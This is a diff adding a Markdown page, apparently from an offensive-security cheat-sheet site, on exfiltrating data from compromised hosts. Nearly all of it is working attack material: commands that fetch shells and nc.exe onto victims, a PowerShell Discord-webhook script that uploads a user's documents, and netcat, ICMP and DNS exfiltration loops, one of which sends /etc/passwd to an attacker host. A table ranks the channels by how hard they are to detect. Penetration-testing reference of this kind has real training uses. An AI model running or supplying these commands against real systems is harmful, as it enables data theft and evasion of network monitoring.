@@ -1,0 +1,219 @@
+---
+title: "Exfiltration"
+description: "Techniques and tools for transferring files and data out of compromised environments using HTTP, SMB, FTP, DNS, ICMP, and collaboration platform webhooks."
+---
+
+## Overview
+
+Exfiltration is the process of transferring data from a compromised host to an attacker-controlled location. This page covers common transfer techniques across multiple protocols and operating systems.
+
+<Tip>
+Check [lots-project.com](https://lots-project.com/) to find commonly whitelisted domains that can be abused for exfiltration — these help blend traffic with legitimate services.
+</Tip>
+
+## Base64 Copy-Paste
+
+**Linux**
+
+```bash
+base64 -w0 <file>   # Encode file to base64
+base64 -d file      # Decode base64 file
+```
+
+**Windows**
+
+```cmd
+certutil -encode payload.dll payload.b64
+certutil -decode payload.b64 payload.dll
+```
+
+## HTTP
+
+### Download on Victim
+
+**Linux**
+
+```bash
+wget 10.10.14.14:8000/shell.py -O /dev/shm/shell.py
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+```
+
+**Windows**
+
+```powershell
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
+bitsadmin /transfer transfName /priority high http://example.com/file.pdf C:\downloads\file.pdf
+```
+
+### Upload Server (Attacker Side)
+
+```bash
+# Python upload server
+python3 -m pip install --user uploadserver
+python3 -m uploadserver
+
+# Send a file
+curl -X POST http://HOST/upload -F 'files=@file.txt'
+
+# With basic auth
+python3 -m uploadserver --basic-auth hello:world
+curl -X POST http://HOST/upload -F 'files=@file.txt' -u hello:world
+```
+
+### HTTPS Server
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import ssl
+
+httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
+httpd.serve_forever()
+```
+
+## Collaboration Platform Webhooks
+
+Webhooks (Discord/Slack/Teams) are HTTPS endpoints that accept JSON — commonly allowed to trusted SaaS domains, making them ideal for C2 beaconing and exfiltration.
+
+```powershell
+# PowerShell Discord exfil PoC
+$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+$client = [System.Net.Http.HttpClient]::new()
+
+function Send-DiscordFile {
+    param([string]$Path, [string]$Name)
+    if (-not (Test-Path $Path)) { return }
+    $bytes = [System.IO.File]::ReadAllBytes($Path)
+    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
+    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
+    $mp = New-Object System.Net.Http.MultipartFormDataContent
+    $mp.Add($jsonContent, "payload_json")
+    $mp.Add($fileContent, "file", $Name)
+    $resp = $client.PostAsync($webhook, $mp).Result
+    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
+}
+
+Send-DiscordFile -Path "$env:USERPROFILE\Documents\sensitive.txt" -Name "sensitive.txt"
+```
+
+## SMB
+
+**Attacker (Kali) as SMB Server**
+
+```bash
+impacket-smbserver -smb2support kali `pwd`
+# For newer Windows with auth:
+impacket-smbserver -smb2support -user test -password test test `pwd`
+```
+
+**Windows Client**
+
+```cmd
+\\10.10.14.14\kali\shell.exe
+net use z: \\10.10.14.14\test /user:test test
+```
+
+## FTP
+
+**FTP Server (Python)**
+
+```bash
+pip3 install pyftpdlib
+python3 -m pyftpdlib -p 21
+```
+
+**Windows FTP Client (No FTP binary)**
+
+```cmd
+echo open 10.11.0.41 21 > ftp.txt
+echo USER anonymous >> ftp.txt
+echo anonymous >> ftp.txt
+echo bin >> ftp.txt
+echo GET shell.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -n -v -s:ftp.txt
+```
+
+## TFTP
+
+```bash
+# TFTP server (Python)
+pip install ptftpd
+ptftpd -p 69 tap0 .
+
+# Victim download
+tftp -i <KALI-IP> get nc.exe
+```
+
+## SCP / SSHFS
+
+```bash
+# SCP — copy from victim (attacker has SSH running)
+scp <username>@<Attacker_IP>:<directory>/<filename> .
+
+# SSHFS — mount victim directory on attacker
+sudo apt-get install sshfs
+sudo sshfs -o allow_other,default_permissions <TargetUser>@<TargetIP>:<path>/ /mnt/sshfs/
+```
+
+## Netcat
+
+```bash
+# Attacker receives
+nc -lvnp 4444 > received_file
+
+# Victim sends
+nc -vn <attacker_IP> 4444 < exfil_file
+```
+
+## ICMP Exfiltration
+
+```bash
+# Send file content via ping (4 bytes per packet)
+xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line <attacker_IP>; done
+```
+
+```python
+from scapy.all import *
+
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type == 0:
+            data = pkt[ICMP].load[-4:]
+            print(f"{data.decode('utf-8')}", flush=True, end="")
+
+sniff(iface="tun0", prn=process_packet)
+```
+
+## DNS Exfiltration
+
+```bash
+# Tools
+# https://github.com/Stratiz/DNS-Exfil
+
+# Encode and exfil a file via DNS queries
+for b in $(xxd -p /etc/passwd | fold -w 60); do
+    nslookup $b.yourdomain.com attacker-dns
+done
+```
+
+## Protocol Summary
+
+| Protocol | Use Case | Detection Risk |
+|----------|----------|---------------|
+| HTTP/S | File download/upload, C2 | Low (blends with web traffic) |
+| SMB | File share, Windows environments | Medium |
+| FTP | Simple file transfer | Medium-High |
+| DNS | Covert channel, exfil through strict firewalls | Low |
+| ICMP | Bypass firewalls blocking TCP/UDP | Low-Medium |
+| Webhook | C2 over trusted SaaS domains | Very Low |
+| SCP/SSHFS | Direct file transfer with SSH | Low |
+
+## References
+
+- [Discord as a C2 and the cached evidence left behind (PentestPartners)](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord Webhooks — Execute Webhook API](https://discord.com/developers/docs/resources/webhook#execute-webhook)
